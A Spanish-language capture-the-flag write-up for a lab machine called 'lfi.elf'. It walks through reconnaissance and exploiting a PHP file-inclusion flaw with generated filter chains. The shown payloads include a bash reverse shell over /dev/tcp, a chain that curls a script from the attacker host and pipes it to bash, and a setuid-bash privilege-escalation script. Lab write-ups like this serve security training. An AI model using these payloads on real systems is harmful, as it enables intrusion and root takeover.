# Maquina: lfi.elf
- Dificultad: Dificil
- OS: Linux
- 
![](../../assets/images/lfi-elf/banner.png)

---

## Reconocimiento

El escaneo basico fue realizado con nmap, descubriendo el puerto 80.
![](../../assets/images/lfi-elf/1.png)

La web se ve interesante, un estilo neon llamativo.
Lo unico accesible es el boton que lleva a otra pagina.
![](../../assets/images/lfi-elf/2.png)

Haciendo un escaneo con gobuster se pueden descurbrir varias rutas interesantes.
Viendo algunos directorios y archivos con varias extenciones.
![](../../assets/images/lfi-elf/4.png)

Viendo el archivo **secret.txt** se puede observar un mensaje interesante, una especie de nota para el usuario lin.
El mensaje incita a investigar para encontrar un acceso, 
![](../../assets/images/lfi-elf/5.png)

La herramienta wufzz se uso para probar varias combinaciones, probando una wordlists para encontrar un porametro que permita injectar codigo.
Encontrando el parametro **search** en php, y con el payload que se uso aqui se confirma una lectura de archivos.
![](../../assets/images/lfi-elf/6.png)

Usando curl se puede visualizar mejor que payload que se uso.
![](../../assets/images/lfi-elf/7.png)

---

## Explotacion

### Web

Para empezar con la explotacion se usara el exploit [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator).
Este exploit permite generar cadenas de php, las cuales agregar a la peticion web y aprovechar el LFI.

La explotacion trata de crear un archivo que contenga una reverse shell, crear un servidor simple con python y con **php_filter_chain_generator** se generaran cadenas para ejecutar la reverse shell. 

El archivo clave sera el **shell**, el cual contiene el script en bash.

```
#!/bin/bash

bash -i >& /dev/tcp/172.17.0.1/443 0>&1
```

Despues de crear el archivo se crea la cadena usando el script y se usa python para crear un servidor simple, logrando compartir el archivo.

![](../../assets/images/lfi-elf/9.png)

> Nota
> importante que la cadena tenga la direccion ip y el puerto en el que python expone el servicio web.
> La cadena usa curl para hacer la consulta, obtener el archivo y ejecutarlo.

```
# Generar cadena
python3 php_filter_chain_generator.py --chain '<?= `curl 172.17.0.1:8000/shell|bash` ?>'

# Levantar servidor python
python3 -m http.server 8000

# Escuchar con netcat en el puerto
# (en este caso se usa penelope por comodidad, ya que penelope crea la coneccion de escucha con netcat y adapta automaticamente el tratamiento de la tty)
penelope -p 443
```

### Terminal

Ya dentro de la terminal se pudieron encontrar cosas interesantes.
En el directorio **/var/www/** se encuentran algunas carpetas ocultas, dentro de varias carpetas hay un archivo interesdante, el archivo **passwords.txt**

![](../../assets/images/lfi-elf/10.png)

Teniendo ya la clave de lin se pudo acceder a la consola de el usuario.
Encontrando en su carpeta principal un programa sencillo en python, mostrando este archivo una libreria peculiar, la cual sera el vector de ataque.

![](../../assets/images/lfi-elf/11.png)

Buscando el nombre de la libreria se pudo encontrar el ejecutable de esta, logrando ver que en su ejecutable este requiere un archivo llamado **/tmp/script.sh**.

![](../../assets/images/lfi-elf/12.png)

El siguiente paso es crear el script, haciendo que el programa use la libreria, recurra al script y otorge permisos de el usuario root.
Consiguiendo asi la escalada de privilegios.

```
#!/bin/bash
chmod u+s /bin/bash
```

![](../../assets/images/lfi-elf/13.png)

---

## Pickle !!
![](../../assets/images/lfi-elf/pickle.png)
